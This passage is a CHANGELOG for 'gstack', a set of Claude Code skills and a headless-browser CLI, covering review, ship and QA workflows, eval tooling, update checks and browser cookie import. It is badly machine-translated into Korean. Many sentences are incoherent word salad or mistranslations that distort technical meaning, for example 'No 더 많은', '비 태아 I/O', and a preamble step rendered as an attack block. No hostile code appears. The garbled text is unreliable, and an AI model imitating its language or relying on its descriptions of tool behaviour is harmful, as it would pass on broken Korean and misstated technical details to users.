- **지금 리뷰 결과가 실제로 고정되지 않은 것을 나열합니다.** `/review`와 `/ship`는 정보적인 발견 (dead 코드, 시험 간격, N+1 쿼리)를 인쇄하기 위하여 이용되고 그 후에 무시합니다. 지금 각 발견은 작용을 얻고 있습니다: 명백한 기계적인 고침은 자동적으로 적용되고, 진짜로 주위 문제는 8개의 분리되는 신속한 대신 단 하나 질문으로 배치됩니다. 당신은 각 자동 고침을 위한 `[AUTO-FIXED] file:line Problem → what was done`를 보십시오.
- **"단추가"와 "첫째로 일합니다."** 데드 코드, stale 코멘트, N+1 쿼리 자동 고정을 얻을. 보안 문제, 인종 조건, 디자인 결정은 귀하의 전화를 위해 표면. 분류는 하나 장소에 살고 (`review/checklist.md`) 그래서 모두 `/review` 그리고 `/ship` 동기화에 머물.

### 고정

- **`$B js "const x = await fetch(...); return x.status"` 현재 작동 중입니다.** `js` 명령은 모든 표현으로 감싸기 위하여 이용했습니다. 이렇게 `const`, semicolons 및 다 선 코드는 모두 끊었습니다. 그것은 지금 문을 검출하고 구획 래퍼를, 이미 했습니다 `eval` 같이 다만 이용합니다.
- **드롭다운 옵션을 클릭 no 더 이상 영원히 걸린다.** 에이전트가 snapshot에서 `@e3 [option] "Admin"`를 보고 `click @e3`, gstack를 실행하면 불가능한 Playwright 클릭으로 거는 대신 옵션이 자동 선택됩니다. 올바른 것은 단지 발생합니다.
- **click가 잘못된 도구일 때, gstack는 당신을 말합니다.** CSS selector를 통해 `<option>` 를 클릭해서 암호화 Playwright 오류로 시간을 내어 사용했습니다. 이제 `"Use 'browse select' instead of 'click' for dropdown options."`를 얻습니다.

### 기여자

- Gate Classification → Severity Classification 이름 (단, 표시 순서를 결정합니다, 당신이 프롬프트를 볼지 여부).
- `review/checklist.md`에 추가된 수정 첫번째 허리즘 단면도. canonical AUTO-FIX 대 ASK 분류.
- 새로운 검증 시험: `Fix-First Heuristic exists in checklist and is referenced by review + ship`.
- `read-commands.ts`에서 `needsBlockWrapper()`와 `wrapForEvaluate()` 돕기로 추출했습니다. `js`와 `eval` 명령 모두에 의해 공유됩니다 (DRY).
- `getRefRole()` 에 `BrowserManager` 추가. ref 선택자를 위한 ARIA 역할에 `resolveRef` 반환 유형 바꾸지 않고 노출합니다.
- handler 자동 루트를 클릭 `[role=option]` refs 에 `selectOption()` 부모를 통해 `<select>`, DOM `tagName` 사용자 지정 목록 상자 구성 요소를 차단하는 것을 방지하기 위해 체크.
- 6개의 새로운 시험: 멀티라인 js, semicolons, 문 키워드, 간단한 표현, 옵션 자동 여정, CSS 옵션 오류 지도.

## 0.4.4. 2026-03-16

- **새로운 릴리스는 1 시간 미만으로 감지, 하루 반하지.** 업데이트 체크 캐시는 12 시간으로 설정되어있었습니다. 즉, 새로운 릴리스가 하락하면서도 오래된 버전에 갇혀있을 수 있습니다. 이제 "당신은 날짜까지"가 60 분 후에 만료되므로 시간 내에 업그레이드를 볼 수 있습니다. "업그레이드 사용 가능"은 12 시간 동안 여전히 나그를 (포인트입니다).
- **`/gstack-upgrade` 항상 실제 검사합니다.** 실행 `/gstack-upgrade` 직접 캐시를 우회하고 GitHub에 대한 신선한 체크를합니다. No 더 많은 "당신은 이미 최신에있을 때"당신은 없습니다.

### 기여자

- `last-update-check` 캐시 TTL: `UP_TO_DATE`, `UPGRADE_AVAILABLE`를 위한 720 분을 위한 60 분.
- `--force` 플래그를 `bin/gstack-update-check` (체크 파일이 체크하기 전에 삭제) 추가했습니다.
- 3개의 새로운 시험: `--force` 버스트 UP_TO_DATE 시렁, `--force` 버스트 UPGRADE_AVAILABLE 시렁, 60 분 TTL 시동 시험 `utimesSync`.

## 0.4.3. 2026-03-16

- **새로운 `/document-release` 기술.** `/ship` 이후 실행하지만, 합병 전에. 그것은 프로젝트에서 모든 doc 파일을 읽는다, 단 설정 diff, 업데이트 README, ARCHITECTURE, CONTRIBUTING, CHANGELOG, 그리고 TODOS 실제로 발송되는 것을 일치하기 위하여. 위험 변화는 질문으로 표면이 납니다; 다른 모든 것은 자동적입니다.
- **모든 질문은 지금 결정 명확합니다, 매번.** gstack 이전의 세션이 실행되기 전에 gstack가 전체 컨텍스트와 일반 영어 설명을 제공합니다. 이제 모든 질문. 단일 세션에서도. 프로젝트, branch, 그리고 무슨 일이 일어나고, 중간 콘텍스트 스위치를 이해하기에 충분하게 설명합니다. No 더 많은 "소거, 나에게 더 간단하게 설명합니다."
- **브랜딩은 항상 정합니다.** gstack 이제 대화가 시작될 때 snapshot에 재해 대신 실행 시간 branch를 감지합니다. branch 교체를 전환하십시오? gstack는 유지합니다.

### 기여자

- ELI16 규칙을 기본 AskUserQuestion 형식으로 옮겼습니다. 두 개 대신 no `_SESSIONS >= 3` 조건으로 한 형식.
- `_BRANCH` 사전 공격 차단 (`git branch --show-current`)에 대한 검출을 떨어뜨리고 있습니다.
- branch 검출 및 단순화 규칙에 대한 회귀 감시 테스트를 추가했습니다.

## 0.4.2. 2026-03-16

- **`$B js "await fetch(...)"` 이제는 작동합니다.** `$B js` 또는 `$B eval`의 `await`는 동기화 컨텍스트에서 자동적으로 감싸입니다. No 더 많은 `SyntaxError: await is only valid in async functions`. 단선 eval 파일 반환 값은 직접; 다 선 파일 사용은 `return`를 명시했습니다.
- **기여 모드는 이제 반영되지 않고 반응합니다.** 뭔가 휴식, 기여자 모드가 이제 주기적인 반사를 초래할 때만 피링 보고서 대신: "당신의 gstack 경험 0-10을 평가하십시오. 10? 이유에 대해 생각하십시오." 캐스케치 품질-의 삶 문제 및 마찰은 수동 감지 놓습니다. 보고서는 이제 0-10 등급과 "이 10"이 행동 가능한 개선에 초점을 맞추기 위해 "무엇이 만들 것입니다.
- **지금 스킬은 branch 대상을 존중합니다.** `/ship`, `/review`, `/qa`, `/plan-ceo-review`는 branch를 PR 실제로 `main` 대신 대상을 검출합니다. 쌓은 branch, 지휘자 작업 공간 대상 기능 branch, 그리고 `master`를 사용하여 다시 할당하십시오.
- **`/retro`는 default branch에서 작동합니다.** `master`, `develop`, 또는 다른 default branch 이름을 사용하여 저장소는 자동적으로 검출됩니다. no 더 빈 복고풍은 branch 이름이 잘못되었기 때문에.
- **새로운 `{{BASE_BRANCH_DETECT}}` 위주** 기술 저자에 대 한. 어떤 템플릿에 그것을 드롭 하 고 3 단계 branch 탐지 (PR 기초 → repo default → fallback) 무료로.
- **3 새로운 E2E 연기 시험** 검증된 기본 branch 검출은 배, 검토 및 복고풍 기술에 걸쳐 종결을 합니다.

### 기여자

- Added `hasAwait()` helper with comment-stripping to avoid false positives on `// await` in eval files.
- 스마트 eval 래핑 : 단일 라인 → 표현 `(...)`, 멀티 라인 → 블록 `{...}` 와 `return`.
- 6개의 새로운 async 감싸는 단위 시험, 40의 새로운 contributor 형태 preamble validation 시험.
- Calibration 예제는 과거의 버그 포스트 수정을 피하기 위해 ( "사용되지 않음")로 프레임.
- Added "Writing SKILL templates" section to CLAUDE.md. rules for natural language over bash-isms, dynamic branch detection, self-contained code blocks.
- Hardcoded-main 회귀 테스트는 하드 코딩 된 `main`와 git 명령의 모든 `.tmpl` 파일을 스캔합니다.
- QA 템플릿 정리: `REPORT_DIR` 쉘 변수 제거, prose에 단순화된 포트 감지.
- gstack-upgrade 템플릿: bash 블록 사이의 가변 참조에 대한 명시적 크로스 단계 prose.

## 0.4.1. 2026-03-16

- **gstack 이제 나사가 될 때 공지합니다.** 기여자 모드 (`gstack-config set gstack_contributor true`) 및 gstack를 자동으로 씁니다. 당신이해야 하는 것을, 무슨 부록, 재개발 단계. 다음에 시간 뭔가 성가, 버그 보고서 이미 작성. 포크 gstack 그리고 자신을 수정.
- **여러 세션을 찾나요? gstack가 유지됩니다.** 만약 당신이 3 gstack 창이 열릴 때, 모든 질문은 이제 branch, 그리고 당신이 일한 무슨을 당신이 말하는 당신을 말합니다. No 질문 생각에 더 많은 별을 달아서 "그것은 이?"
- **자주 묻는 질문** 너와 생각을 만들기에 대한 옵션 대신, gstack는 당신이 무엇을 선택하고 왜 무엇을 알려줍니다. 모든 기술에 걸쳐 동일한 명확한 형식.
- **/review 이제는 잊어버린 버린 럼 핸들러를 잡아.** 새 상태, 계층 또는 유형 상수? /review는 각 스위치 문, allowlist를 통해 추적하고, 당신의 코디베이스에 필터링합니다. 변경된 파일이 아닙니다. "값을 추가하지만 "그것을 처리하는 것을 잊어"그런 버그의 종류가 발송하기 전에.

### 기여자

- 모든 11개의 기술 템플릿을 통해 `{{UPDATE_CHECK}}`로 이름을 변경했습니다. 이제 한 시작 블록은 업데이트 체크, 세션 추적, 기여자 모드 및 질문 형식을 처리합니다.
- DRY'd plan-ceo-review and plan-eng-review question formatting to reference a preamble baseline 대신 duplicating 규칙.
- CHANGELOG 스타일 가이드 및 공급 업체 인 symlink 인식 docs를 CLAUDE.md로 추가했습니다.

## 0.4.0. 2026-03-16

### 추가
- **QA-만 기술** (`/qa-only`). 수정 없이 QA 형태를 찾아내고 문서 버그를 찾아내는 보고 전용 QA 형태. 당신의 코드를 만지기 없이 당신의 팀에 청결한 버그 보고를 떨어져.
- **QA 고침 반복**. `/qa`는 이제 발견 수정 주기를 실행합니다: 버그를 발견하고, commit를 수정하고, 수정을 확인하기 위하여 재 neavigate를 수정했습니다. 발송하는 부서지는 한 명령.
- **플랜-에QA 흡음 흐름**. `/plan-eng-review`는 `/qa`가 자동적으로 픽업하는 시험 계획 artifacts를 씁니다. 당신의 기술설계 검토는 지금 no 수동 복사 효력과 QA 시험으로 직접 먹이를.
- **`{{QA_METHODOLOGY}}` DRY 위주**. 공유 QA 방법론 블록은 `/qa`와 `/qa-only` 템플릿으로 주사했습니다. 테스트 기준을 업데이트할 때 동기화에 있는 두 기술을 모두 유지하십시오.
- **Eval 효율성 미터**. 턴, 지속시간, 그리고 지금 자연 언어 **테이크아웃** 논평을 가진 모든 eval 표면의 맞은편에 표시된 비용. 당신의 신속한 변화가 에이전트을 더 빠르거나 더 느리게 하는지 눈에 보십시오.
- **`generateCommentary()` 엔진**. 비교 deltas를 해석해서는 안 해서는 안 해서는 안 된다: 깃발 회귀, 주 개선, 전반적인 효율성 요약을 일으키다.
- **Eval 목록 열**. `bun run eval:list`는 지금 뛰기 당 회전과 내구를 보여줍니다. 비싸거나 느린 뛰기 즉시.
- **Eval 요약 per-test 효율성**. `bun run eval:summary`는 달리는 당 시험 당 평균 turns/duration/cost를 보여줍니다. 시험이 당신에게 시간 이상 요하는 것을 확인합니다.
- **`judgePassed()` 단위 시험**. 추출 및 테스트 패스/fail 판단 논리.
- **3 새로운 E2E 테스트**. qa 전용 접두사 난간, commit 검증, 플랜 - eng-review test-plan artifact로 qa 수정 루프.
- **브라우저 ref staleness 탐지**. `resolveRef()` 이제 페이지 mutations 후에 stale refs를 검출하는 요소 수를 검사합니다. SPA 항법 no는 더 긴 누락한 성분에 30 초의 timeout를 일으키는 원인이 됩니다.
- 3 new snapshot tests for ref staleness.

### 변경
- QA 기술 프롬프트는 명시된 2 사이클 워크플로우로 재건축 (find → fix → check).
- `formatComparison()` 이제는 per-test 회전과 내구 deltas를 포함합니다.
- `printSummary()`는 회전과 내구 열을 보여줍니다.
- `eval-store.test.ts` 고정 사전 노출 `_partial` 파일 assertion 버그.

### 고정
- 브라우저 ref staleness. refs는 페이지 뮤테이션 (예를들면 SPA 항법)의 앞에 모아지고 재 수집됩니다. 동적인 위치에 플라키 QA 실패의 종류를 삭제합니다.

## 0.3.9. 2026-03-15

### 추가
- **`bin/gstack-config` CLI**. `~/.gstack/config.yaml`를 위한 간단한 get/set/list 공용영역. 지속적인 조정 (auto_업그레이드, 업데이트_check)를 위한 갱신 검사 그리고 향상 기술에 의해 사용하는.
- **Smart Update 체크**. 12h 캐시 TTL ( 24h), 사용자가 격상시킬 때 폭발적인 snooze backoff (24h → 48h → 1 주), `update_check: false` config 선택권 완전히 무능하게 검사합니다. 새로운 버전이 풀어 놓을 때 누비이제 리셋.
- **자동 업그레이드 모드**. 설정 `auto_upgrade: true` config 또는 `GSTACK_AUTO_UPGRADE=1` env var에서 업그레이드 프롬프트를 건너 자동으로 업데이트합니다.
- **4option 업그레이드 신속한**. "Yes, 업그레이드 지금", "Always는 지금까지 나를 유지", "지금까지"(소노즈), "나는 다시 물었다"(사용).
- **공급 업체**. `/gstack-upgrade`는 현재 프로젝트에서 로컬 공급업체 사본을 감지하고 업데이트하여 기본 설치를 업그레이드합니다.
- 25 새로운 테스트 : 11 gstack-config CLI, 14 snooze/config 업데이트 체크 경로.

### 변경
- README upgrade/troubleshooting 섹션은 긴 풀 명령 대신 `/gstack-upgrade`를 참조하는 것을 단순화했습니다.
- config 편집을 위한 `Write` 도구 권한으로 v1.1.0에 범퍼된 기술 템플릿을 업그레이드합니다.
- 모든 SKILL.md는 새로운 향상 교류 묘사로 새롭게 한 전방체.

## 0.3.8. 2026-03-14

### 추가
- **TODOS.md 진실의 단 하나 근원으로**. `TODO.md` (roadmap)과 `TODOS.md` (near-term)을 P0-P4 우선순위 주문 및 완료된 단면도로 구성된 하나의 파일로 병합했습니다.
- **`/ship` 단계 5.5: TODOS.md 관리**. 자동검출은 diff에서 완성된 아이템을 완료하고, 버전의 표기로 행한 표는 /reorganize TODOS.md를 누락하거나 비축하면 된다.
- **크로스스킬 TODOS 인식**. `/plan-ceo-review`, `/plan-eng-review`, `/retro`, `/review`, `/qa`는 프로젝트 컨텍스트를 위해 TODOS.md를 읽었습니다. `/retro`는 Backlog 건강 메트릭 (열려있는 조사, P0/P1 품목, churn)를 추가합니다.
- **공유 `review/TODOS-format.md`**. 형식을 막는 `/ship`와 `/plan-ceo-review`에 의해 참조되는 canonical TODO 품목 체재 (DRY).
- **Greptile 2 층 대답 체계**. Tier 1 (친절, 인라인 diff + 설명) 첫 번째 응답; Tier 2 (확실, 전체 증거 체인 + 재랭크 요청) 때 Greptile 다시 엽 후.
- **Greptile 응답 템플릿**. `greptile-triage.md`의 구조화 템플릿 (inline diff), 이미 고정 된 (무엇이 완료되었는지), 및 false 긍정적 인 (비밀 + 제안 된 재랭크). Vague를 1 라인 replies로 대체하십시오.
- **Greptile 에스컬레이션 검출**. GStack가 단계 2에 주석 실과 자동 측정에 응답하기 전에 검출하는 명시된 알고리즘.
- **Greptile severity 재랭킹**. 현재 `**Suggested re-rank:**`가 Greptile가 잘못된 이슈를 포함해 답을 얻게 됩니다.
- `TODOS-format.md` 의 기술에 대한 정적 검증 테스트.

### 고정
- **`.gitignore` 은폐된 실패를 침묵하게 삼키다**. `ensureStateDir()` 가시 `catch {}` 로 대체 ENOENT - 전용 침묵; ENOENT 오류 (EACCES, ENOSPC) 로 로그인 `.gstack/browse-server.log`.

### 변경
- `TODO.md` 삭제. 모든 항목은 `TODOS.md`로 병합.
- `/ship` 단계 3.75와 `/review` 단계 5는 `greptile-triage.md`에서 지금 응답 템플렛 그리고 에스컬레이션 탐지를 참조합니다.
- `/ship` 단계 6 commit 주문에는 TODOS.md가 VERSION + CHANGELOG와 함께 마지막 commit에 포함될 수 있습니다.
- `/ship` 단계 8 PR 몸은 TODOS 단면도를 포함합니다.

## 0.3.7. 2026-03-14

### 추가
- **스크린 샷 요소/region 클립**. `screenshot` 명령은 CSS selector 또는 @ref (`screenshot "#hero" out.png`, `screenshot @e3 out.png`), 지역 클립 (`screenshot --clip x,y,w,h out.png`), viewport-only mode (`screenshot --viewport out.png`)를 통해 원소 작물을 지원합니다. Playwright의 기본 `locator.screenshot()` 및 `page.screenshot({ clip })`를 사용하십시오. 전체 페이지는 기본으로 남아 있습니다.
- 모든 스크린 샷 모드 (뷰포트, CSS, @ref, 클립) 및 오류 경로 (알 수 없는 깃발, 상호 exclusion, 잘못된 coords, 경로 검증, 비외선 선택기)를 다루는 10 새로운 테스트.

## 0.3.6. 2026-03-14

### 추가
- **E2E 관측성**. 심박 파일 (`~/.gstack-dev/e2e-live.json`), 실행 로그 디렉토리 (`~/.gstack-dev/e2e-runs/{runId}/`), progress.log, per-test NDJSON 성적표, 지속 실패 성적표. 모든 I/O 비 태아.
- **`bun run eval:watch`**. 라이브 터미널 대시보드는 심베트 + 부분적인 eval 파일을 매 1s 읽습니다. 완료된 시험, 현재는 turn/tool 정보, stale detection (>10min), 진행 상황을 위해 `--tail`를 가진 시험.
- **증가 eval 득점**. `savePartial()`는 각 시험이 완료된 후에 `_partial-e2e.json`를 쓰습니다. Crash-resilient: 부분적인 결과는 죽는 뛰기 살아납니다. 결코 청소하지 마십시오.
- **기계 학습 진단**. `exit_reason`, `timeout_at_turn`, `last_tool_call` 필드는 eval JSON로 구성되어 있습니다. 자동화된 고정 루프를 위한 `jq` 쿼리를 가능하게 합니다.
- **API 연결성 사전 검사**. E2E 스위트는 테스트 예산을 연소하기 전에 ConnectionRefusion에 즉시 던졌습니다.
- **`is_error` 탐지**. `claude -p` `is_error: true` API 실패에 `is_error: true`를 가진 `subtype: "success"`를 돌려보낼 수 있습니다. 이제 `error_api`로 정확하게 분류했습니다.
- **스트림 json NDJSON 파서**. `parseNDJSON()` E2E `claude -p --output-format stream-json --verbose`에서 실시간 E2E 진도를 위한 순수한 기능.
- **Eval의 지속**. 이전 실행에 대한 자동 비교를 가진 `~/.gstack-dev/evals/`에 저장된 결과.
- **Eval CLI 도구**. `eval:list`, `eval:compare`, `eval:summary`, eval 역사를 검사하기 위한.
- **모든 9개의 기술이 `.tmpl` 템플릿으로 변환되었습니다.**. 플랜소-검토, 플랜-인리뷰, 복고풍, 리뷰, 배는 이제 `{{UPDATE_CHECK}}` 위주자를 사용합니다. 업데이트 체크를 위한 진리의 단일 소스.
- **3 층 eval 스위트**. Tier 1: 정적 유효성 (무료), Tier 2: E2E를 통해 `claude -p` (~$3.85/run), Tier 3: LLM-as-judge (~$0.15/run).) `EVALS=1`.
- **Planted-bug outcome 테스트**. 알려진 버그와 eval 정착물, LLM 판단 점수 탐지.
- 15 관측성 단위는 심장부 삽, progress.log 체재, NDJSON naming, 득점방해, 최종화, 시계 연출, stale 탐지, 비 태아 I/O를 덮는 시험합니다.
- E2E 플랜소아리뷰, 플랜소아리뷰, 복고풍 기술 테스트
- 업데이트 체크 아웃 코드 회귀 테스트.
- `test/helpers/skill-parser.ts`. `getRemoteSlug()` git 원격 감지.

### 고정
- **의 붓기 바이너리 발견은 에이전트에 끊기**. SKILL.md 설정 블록의 `browse/dist/browse` 경로와 `find-browse` 간접을 대체했습니다.
- **업데이트 체크 아웃 코드 1 misleading Agent**. no 갱신이 가능한 경우 `|| true`를 비제로 출구를 막기 위하여 `|| true`를 추가했습니다.
- **browse/SKILL.md 누락된 설정 블록**. `{{BROWSE_SETUP}}` 위주를 추가했습니다.
- **플랜 일람-세로리 전망**. init git repo intest dir, Skip codebase exploration, 420s에 범프 타임아웃.
- Planted-bug eval 신뢰성. 단순 프롬프트, 낮은 검출 베이스라인, max_turns flakes에 탄력.

### 변경
- **템플릿 시스템 확장**. `{{UPDATE_CHECK}}`와 `{{BROWSE_SETUP}}` 위주자 `gen-skill-docs.ts`. 모든 검색 사용 기술은 진실의 단일 소스에서 생성합니다.
- 특정 arg 형식, 유효 값, 오류 행동 및 반환 유형과 함께 14 명령 설명에 얽힌.
- 설정 블록은 workspace-local path를 먼저 확인합니다. (개발용), 글로벌 설치로 돌아갑니다.
- LLM 이발리 판사 Haiku에서 Sonnet 4.6로 업그레이드.
- `generateHelpText()` 자동 생성 COMMAND_DESCRIPTIONS (손 유지된 도움 원본을 대체하십시오).

## 0.3.3. 2026-03-13

### 추가
- **SKILL.md 템플릿 시스템**. `.tmpl` 파일 `{{COMMAND_REFERENCE}}` 및 `{{SNAPSHOT_FLAGS}}` placeholders, 빌드 시간에 소스 코드에서 자동 생성. 구조적으로 명령을 docs와 코드 사이에 드리프트를 방지합니다.
- **명령 레지스트리** (`browse/src/commands.ts`). 카테고리와 풍부한 설명과 모든 검색 명령에 대한 진실의 단일 소스. 0 측 효과, 빌드 스크립트 및 테스트에서 가져 오기 안전.
- **Snapshot 플래그 메타데이터** (`SNAPSHOT_FLAGS` 배열 `browse/src/snapshot.ts`). 메타데이터 구동 파서는 손 코드화한 스위치/case를 대체합니다. 파서, 문서 및 시험을 1개의 장소에 있는 깃발을 추가하십시오.
- **Tier 1 정적 검증**. 43개의 테스트: `$B` 명령어를 SKILL.md 코드 블록에서 파로, 명령 레지스트리와 snapshot 플래그 메타데이터에 대한 검증
- **Tier 2 E2E 테스트** 을 통해 에이전트 SDK. 실제 Claude 세션, 실행 기술, 검색 오류 스캔. 에 의해 처리 `SKILL_E2E=1` env var (~$0.50/run)
- **Tier 3 LLM-s-judge evals**. Haiku 점수는 clarity/completeness/actionability (threshold ≥4/5)에 docs를 생성하고, 반복 시험 대 수 분대를 위한 반복 시험 플러스 회귀 시험. `ANTHROPIC_API_KEY`에 의해 Gated
- **`bun run skill:check`**. 모든 기술을 보여주는 건강 대쉬보드, 명령 카운트, 유효성 상태, 템플릿 신선도
- **`bun run dev:skill`**. 각 템플릿 또는 소스 파일 변경에 SKILL.md를 재생하고 검증하는 모드를 시청
- **CI 워크플로우** (`.github/workflows/skill-docs.yml`). `gen:skill-docs`를 push/PR로 실행하면 출력이 투입된 파일과 다를 경우 실패
- `bun run gen:skill-docs` 수동 재생 스크립트
- `bun run test:eval` LLM-s-judge evals
- `test/helpers/skill-parser.ts`. Markdown에서 `$B` 명령을 추출하고 검증합니다.
- `test/helpers/session-runner.ts`. Agent SDK 오류 패턴 스캐닝 및 성적표 저장
- **ARCHITECTURE.md**. daemon 모델, 보안, ref 시스템, 로깅, 충돌 복구를 포함하는 디자인 결정 문서
- **지휘자 통합** (`conductor.json`). 작업 공간 설정용 수명주기 후크/teardown
- **`.env` 전파**. `bin/dev-setup` 복사 `.env` 주요 worktree에서 도체 작업 공간으로
- `.env.example` 템플릿 API 키 구성

### 변경
- 이제 빌드는 binaries를 컴파일하기 전에 `gen:skill-docs`
- `parseSnapshotArgs`는 metadata-driven (switch/case 대신 `SNAPSHOT_FLAGS`를 점화합니다)
- `server.ts`는 `commands.ts` 대신 인라인을 선언합니다.
- SKILL.md 및 browse/SKILL.md는 현재 생성된 파일 (`.tmpl` 대신)입니다.

## 0.3.2. 2026-03-13

### 고정
- Cookie import picker now returns JSON instead of HTML. `jsonResponse()` referenced `url` out of scope, crashing every API call
- `help` 명령은 올바르게 경로를 지정했습니다 (META_COMMANDS 파견 순서로 인해 접근 불가능한)
- 글로벌 서버 no 더 긴 그림자 로컬 변경. `~/.claude/skills/gstack`의 유산 제거 `resolveServerScript()`
- `/tmp/`에서 `.gstack/`로 업데이트된 충돌 로그 경로 참조

### 추가
- **Diff-aware QA 모드**. `/qa` 기능 branch 자동 분석 `git diff`에 /routes는, localhost에 실행된 앱을 검출하고, 변경된 테스트만 검출합니다. No URL는 필요로 합니다.
- **Project-local 검색 상태**. state file, logs, 그리고 모든 서버 상태는 프로젝트 루트 내부 `.gstack/`에서 현재 살고 있다. `git rev-parse --show-toplevel`를 통해 검출된다. No 더 많은 `/tmp` 상태 파일.
- **공유 구성 모듈** (`browse/src/config.ts`). CLI 및 서버의 경로 해상도를 중앙화하고, 중복 포트/state 논리를 삭제합니다.
- **무작위 포트 선택**. 서버는 9400-9409 대신 랜덤 포트 10000-60000을 선택합니다. No 더 많은 CONDUCTOR_PORT 마술 상쇄. No 작업 공간의 주위에 포트 충돌 더.
- **Binary 버전 추적**. 상태 파일은 `binaryVersion` SHA; CLI 자동 갱신은 이진이 재건될 때 서버를 포함합니다
- **레거시 /tmp 정리**. CLI는 신호를 보내기 전에 `/tmp/browse-server*.json` 파일을 검사하고, PID 소유권을 확인하는 오래된 `/tmp/browse-server*.json` 파일을 제거합니다
- **Greptile 통합**. `/review`와 `/ship` fetch와 triage Greptile bot 의견; `/retro`는 Greptile 주 전역의 평균을 추적합니다
- **로컬 dev 모드**. `bin/dev-setup` repo의 repo의 symlinks 기술 in-place 개발을 위해; `bin/dev-teardown`는 세계적인 설치를 복구합니다
- `help` 명령. 에이전트는 모든 명령과 snapshot 플래그를 자기 발견 할 수 있습니다.
- META 신호 의정서를 가진 Version-aware `find-browse`. stale binaries 및 신속한 에이전트을 새롭게 검출하십시오
- `browse/dist/find-browse` git SHA 에 대한 비교 origin/main (4hr 캐시)
- `.version` 파일이 바이너리 버전 추적을 위한 빌드 시간에 기록
- cookie 테이크너 (13테스트) 및 찾기 버전 체크 (10테스트)에 대한 경로 레벨 테스트
- git root detection, BROWSE_STATE_FILE override, keepStateDir, readVersionHash, resolveServerScript 및 버전 mismatch detection를 포함하는 구성 해상도 테스트 (14 테스트)
- CLAUDE.md의 브라우저 상호 작용 지도. mcp\_\_claude-in-chrome\_\_\* 도구를 사용하여 Claude를 방지한다
- CONTRIBUTING.md 빠른 시작, dev 형태 설명 및 다른 저장소에 테스트 branch에 대 한 지침

### 변경
- 파일 위치: `.gstack/browse.json` (와 `/tmp/browse-server.json`)
- 파일 위치: `.gstack/browse-{console,network,dialog}.log` (와 `/tmp/browse-*.log`)
- 원자 상태 파일 쓰기: `.json.tmp` → 이름 (부분 읽기를 전개하십시오)
- CLI는 `BROWSE_STATE_FILE`를 서버로 전달합니다 (서버는 모든 경로에 그것을 파생합니다)
- SKILL.md 설정 체크 파스 META 신호 및 핸들 `META:UPDATE_AVAILABLE`
- `/qa` SKILL.md는 현재 특징 branch에 default로 diff-aware를 가진 4개의 형태 (diff-aware, 가득 차있는, 빠른, 회귀)를 설명합니다
- `jsonResponse`/`errorResponse`는 positional 매개변수 혼란을 방지하기 위하여 선택권 목표를 이용합니다
- 스크립트는 `browse`와 `find-browse` binaries를 컴파일하고 `.bun-build` temp 파일을 정리합니다.
- README Greptile 설정 지침, diff-aware QA 예제, 데모 성적표 수정

## 제거
- `CONDUCTOR_PORT` 마술 상쇄 (`browse_port = CONDUCTOR_PORT - 45600`)
- 항구 검사 범위 9400-9409
- `~/.claude/skills/gstack/browse/src/server.ts`로 레거시가 떨어졌다
- `DEVELOPING_GSTACK.md` (CONTRIBUTING.md로 이름을 지정)

## 0.3.1. 2026-03-12

### 단계 3.5: 브라우저 cookie 수입품

- `cookie-import-browser` 명령. 실제 Chromium 브라우저에서 쿠키를 해독하고 가져 오기 (자, Chrome, Arc, Brave, Edge)
- Interactive cookie Picker web UI 에서 검색 서버 (dark theme, two-panel layout, 도메인 검색, import/remove)에서 제공
- CLI `--domain` 플래그를 비동기 사용
- `/setup-browser-cookies` Claude Code 통합 기술
- macOS async 10s timeout (no event loop blocking)와 키 체인 액세스
- Per-browser AES 키 캐싱 (회당 브라우저 당 1개의 키체인 프롬프트)
- DB 자물쇠 fallback: 안전한 읽을을을 위한 cookie DB에 잠긴 사본
- 암호화 된 cookie 고정 장치가있는 18 단위 테스트

## 0.3.0. 2026-03-12

### 단계 3: /qa 기술. 체계적인 QA 테스트

- 새로운 `/qa` 6단계 워크플로우 기술 (Initialize, Authenticate, Orient, 탐험, 문서, 랩업)
- 세 가지 모드 : 전체 (시스템, 5-10 문제), 빠른 (30 초 연기 테스트), 회귀 (기본 비교)
- 문제 세법 : 7 카테고리, 4 심각도 수준, 페이지 탐험 체크리스트
- 건강 점수 (0-100, 7 카테고리의 무게)와 구조화 된 보고서 템플릿
- Next.js, Rails, WordPress 및 SPA에 대한 프레임 검출 안내
- `browse/bin/find-browse`. DRY `git rev-parse --show-toplevel`를 사용하는 바이너리 발견

### 2 단계: 강화된 브라우저

- Dialog 처리: auto-accept/dismiss, 대화 상자 버퍼, 신속한 텍스트 지원
- 파일 업로드: `upload <sel> <file1> [file2...]`
- 요소 상태 체크: `is visible|hidden|enabled|disabled|checked|editable|focused <sel>`
- ref 라벨이 포함된 스크린 샷은 오버레이드(`snapshot -a`)
- 이전 snapshot (`snapshot -D`)에 대한 스냅 샷 확산
- 비-ARIA clickables (`snapshot -C`)를 위한 Cursor-interactive 성분 검사
- `wait --networkidle` / `--load` / `--domcontentloaded` 플래그
- `console --errors` 필터 (error + 경고만)
- `cookie-import <json-file>` 자동 채우기 도메인 페이지 URL
- 원형부퍼 O(1) console/network/dialog 버퍼에 대한 링 버퍼
- Bun.write()를 가진 Async 완충기 플러시
- 페이지와 건강 검사.evaluate + 2s timeout
- Playwright 오류 포장. AI 에이전트에 대한 작업 가능한 메시지
- Context recreation 보존 cookies/storage/URLs (useragent 수정)
- SKILL.md는 QA로 재 작성하여 10개의 워크플로 패턴을 가진 플레이북을 지향합니다.
- 166 통합 테스트 (was ~63)

## 0.0.2. 2026-03-12

- 프로젝트-local `/browse` installs. 컴파일된 바이너리는 현재 글로벌 설치가 존재하지 않는 대신 `server.ts`를 해결한다.
- `setup`는 stale binaries를 재구축합니다 (단 하나가 누락되지 않음) 그리고 빌드가 실패하면 종료하지 않습니다
- `chain` 명령을 작성 명령에서 실제 오류를 삼키다 (예 : "알 수없는 메타 명령"으로보고 된 내비게이션 타임 아웃)
- 서버가 동일한 명령에 반복적으로 충돌하면 CLI에서 비행된 재시작 루프를 수정합니다.
- Cap console/network 버퍼 50k 항목 (링 버퍼) 대신 경계 없이 성장
- 버퍼가 50k 캡을 보면서 디스크 플러시 중지를 수정
- `ln -snf`를 설정하여 업그레이드에 배열된 symlink를 생성
- `git fetch && git reset --hard` 대신 `git pull`를 사용하여 업그레이드 (손잡이 힘 소진)
- 설치 단순화: 선택적 프로젝트 복사 (replaces submodule 접근)로 글로벌 첫 번째
- README: 영웅, before/after, 데모 성적표, 문제 해결 섹션
- 6개의 기술 (added `/retro`)

## 0.0.1. 2026-03-11

초기 출시.

- 다섯 가지 기술 : `/plan-ceo-review`, `/plan-eng-review`, `/review`, `/ship`, `/browse`
- Headless 브라우저 CLI 40개 이상의 명령, 냉간 상호 작용, 지속 Chromium daemon
